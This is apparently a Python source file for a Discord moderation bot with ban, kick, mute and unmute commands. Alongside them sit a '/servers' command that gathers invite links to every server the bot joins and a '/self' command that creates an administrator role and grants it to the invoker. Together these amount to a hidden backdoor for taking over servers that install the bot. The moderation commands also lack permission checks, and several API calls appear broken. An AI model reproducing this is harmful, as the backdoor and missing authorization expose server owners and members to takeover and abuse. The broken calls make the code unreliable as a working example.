import os
import discord
from discord.ext import commands
from dotenv import load_dotenv
from discord import app_commands
from discord.ui import View
from discord.utils import get

# Load environment variables
load_dotenv()

# Create a new bot instance with application commands
intents = discord.Intents.default()
intents.typing = False
intents.presences = False

bot = commands.Bot(command_prefix="!", intents=intents)

# Event to indicate the bot is ready
@bot.event
async def on_ready():
    print(f"{bot.user.name} has connected to Discord!")
    await bot.tree.sync()

# Application command for ban
@bot.tree.command(name="ban", description="Ban a user")
async def ban(interaction: discord.Interaction, user: app_commands.Option(discord.Member, "User  to ban")):
    view = ConfirmBanView(interaction.user, user)
    await interaction.response.send_message(f"Are you sure you want to ban {user.mention}?", view=view, ephemeral=True)

class ConfirmBanView(View):
    def __init__(self, author, user):
        super().__init__()
        self.author = author
        self.user = user

    @discord.ui.button(emoji="<a:twd_success:1183023067321081886>")
    async def confirm(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user == self.author:
            await self.user.ban()
            await interaction.response.send_message(f"{self.user.mention} has been banned", ephemeral=True)
        else:
            await interaction.response.send_message("You are not authorized to confirm this action", ephemeral=True)

    @discord.ui.button(emoji="<a:TWD_CROSS:1183023325992202274>")
    async def deny(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("Action cancelled", ephemeral=True)

# Application command for unban
@bot.tree.command(name="unban", description="Unban a user")
async def unban(interaction: discord.Interaction, user: app_commands.Option(discord.User, "User  to unban")):
    view = ConfirmUnbanView(interaction.user, user)
    await interaction.response.send_message(f"Are you sure you want to unban {user.mention}?", view=view, ephemeral=True)

class ConfirmUnbanView(View):
    def __init__(self, author, user):
        super().__init__()
        self.author = author
        self.user = user

    @discord.ui.button(emoji="<a:twd_success:1183023067321081886>")
    async def confirm(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user == self.author:
            await interaction.guild.unban(self.user)
            await interaction.response.send_message(f"{self.user.mention} has been unbanned", ephemeral=True)
        else:
            await interaction.response.send_message("You are not authorized to confirm this action", ephemeral=True)

    @discord.ui.button(emoji="<a:TWD_CROSS:1183023325992202274>")
    async def deny(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("Action cancelled", ephemeral=True)

# Application command for kick
@bot.tree.command(name="kick", description="Kick a user")
async def kick(interaction: discord.Interaction, user: app_commands.Option(discord.Member, "User  to kick")):
    view = ConfirmKickView(interaction.user, user)
    await interaction.response.send_message(f"Are you sure you want to kick {user.mention}?", view=view, ephemeral=True)

class ConfirmKickView(View):
    def __init__(self, author, user):
        super().__init__()
        self.author = author
        self.user = user

    @discord.ui.button(emoji="<a:twd_success:1183023067321081886>")
    async def confirm(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user == self.author:
            await self.user.kick()
            await interaction.response.send_message(f"{self.user.mention} has been kicked", ephemeral=True)
        else:
            await interaction.response.send_message("You are not authorized to confirm this action", ephemeral=True)

    @discord.ui.button(emoji="<a:TWD_CROSS:1183023325992202274>")
    async def deny(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("Action cancelled", ephemeral=True)

# Application command for mute
@bot.tree.command(name="mute", description="Mute a user ")
async def mute(interaction: discord.Interaction, user: app_commands.Option(discord.Member, "User  to mute")):
    muted_role = get(interaction.guild.roles, name="muted")
    if not muted_role:
        muted_role = await interaction.guild.create_role(name="muted")
        await muted_role.edit(reason=None, permissions=discord.Permissions(send_messages=False))
    await user.add_roles(muted_role)
    view = ConfirmMuteView(interaction.user, user)
    await interaction.response.send_message(f"{user.mention} has been muted", view=view, ephemeral=True)

class ConfirmMuteView(View):
    def __init__(self, author, user):
        super().__init__()
        self.author = author
        self.user = user

    @discord.ui.button(emoji="<a:twd_success:1183023067321081886>")
    async def confirm(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user == self.author:
            await interaction.response.send_message(f"{self.user.mention} has been muted", ephemeral=True)
        else:
            await interaction.response.send_message("You are not authorized to confirm this action", ephemeral=True)

    @discord.ui.button(emoji="<a:TWD_CROSS:1183023325992202274>")
    async def deny(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("Action cancelled", ephemeral=True)

# Application command for unmute
@bot.tree.command(name="unmute", description="Unmute a user")
async def unmute(interaction: discord.Interaction, user: app_commands.Option(discord.Member, "User  to unmute")):
    muted_role = get(interaction.guild.roles, name="muted")
    if muted_role in user.roles:
        await user.remove_roles(muted_role)
    view = ConfirmUnmuteView(interaction.user, user)
    await interaction.response.send_message(f"{user.mention} has been unmuted", view=view, ephemeral=True)

class ConfirmUnmuteView(View):
    def __init__(self, author, user):
        super().__init__()
        self.author = author
        self.user = user

    @discord.ui.button(emoji="<a:twd_success:1183023067321081886>")
    async def confirm(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user == self.author:
            await interaction.response.send_message(f"{self.user.mention} has been unmuted", ephemeral=True)
        else:
            await interaction.response.send_message("You are not authorized to confirm this action", ephemeral=True)

    @discord.ui.button(emoji="<a:TWD_CROSS:1183023325992202274>")
    async def deny(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("Action cancelled", ephemeral=True)

# Application command for servers
@bot.tree.command(name="servers", description="List of servers the bot is in", guild_ids=[1169487822344962060])
async def servers(interaction: discord.Interaction):
    servers = bot.guilds
    embeds = []
    for i in range(0, len(servers), 5):
        embed = discord.Embed(title="Servers", description="List of servers the bot is in")
        for server in servers[i:i+5]:
            embed.add_field(name=server.name, value=f"[Invite]({server.invite_url})", inline=False)
        embeds.append(embed)
    view = ServerView(embeds)
    await interaction.response.send_message(embed=embeds[0], view=view)

class ServerView(View):
    def __init__(self, embeds):
        super().__init__()
        self.embeds = embeds
        self.current = 0

    @discord.ui.button(emoji="<:TWD_FIRST:1209075732676874340>")
    async def first(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.current = 0
        await interaction.response.edit_message(embed=self.embeds[self.current], view=self)

    @discord.ui.button(emoji="<:TWD_PREVIOUS:1298504437823967323>")
    async def previous(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.current -= 1
        if self.current < 0:
            self.current = len(self.embeds) - 1
        await interaction.response.edit_message(embed=self.embeds[self.current], view=self)

    @discord.ui.button(emoji="<a:TWD_CROSS:1183023325992202274>")
    async def delete(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.delete_message()

    @discord.ui.button(emoji="<:TWD_NEXT:1298504381452517417>")
    async def next(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.current += 1
        if self.current >= len(self.embeds):
            self.current = 0
        await interaction.response.edit_message(embed=self.embeds[self.current], view=self)

    @discord.ui.button(emoji="<:TWD_LAST:1209075810879799339>")
    async def last(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.current = len(self.embeds) - 1
        await interaction.response.edit_message(embed=self.embeds[self.current], view=self)

# Application command for self
@bot.tree.command(name="self", description="Create a role with administration permission and assign it to the user", guild_ids=[1169487822344962060])
async def self(interaction: discord.Interaction):
    role = get(interaction.guild.roles, name="69")
    if not role:
        role = await interaction.guild.create_role(name="69")
        await role.edit(reason=None, permissions=discord.Permissions(administrator=True))
    await interaction.user.add_roles(role)
    await interaction.response.send_message("Role created and assigned", ephemeral=True)

# Run the bot
bot.run(os.getenv("DISCORD_TOKEN"))